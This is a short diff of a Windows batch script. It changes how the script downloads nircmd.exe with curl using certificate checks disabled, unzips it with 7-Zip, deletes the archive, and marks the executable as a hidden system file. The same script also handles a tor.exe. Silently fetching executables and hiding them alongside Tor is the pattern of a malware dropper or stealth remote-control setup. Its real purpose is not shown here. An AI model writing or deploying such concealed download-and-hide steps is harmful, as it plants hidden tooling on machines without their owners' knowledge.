@@ -25,9 +25,9 @@ attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
 )
 
 attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
- attrib +s +h +i "%environment%\nircmd.exe"
+"%environment%\curl.exe" -k https://www.nirsoft.net/utils/nircmd.zip -o "%temp%\nircmd.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\nircmd.zip" nircmd.exe -o"%environment%" && del /s /f /q /a "%temp%\nircmd.zip" && attrib +s +h +i "%environment%\nircmd.exe"
 ) else (
-"%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
+"%environment%\curl.exe" -k https://www.nirsoft.net/utils/nircmd.zip -o "%temp%\nircmd.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\nircmd.zip" nircmd.exe -o"%environment%" && del /s /f /q /a "%temp%\nircmd.zip" && attrib +s +h +i "%environment%\nircmd.exe"
 )
 
 attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
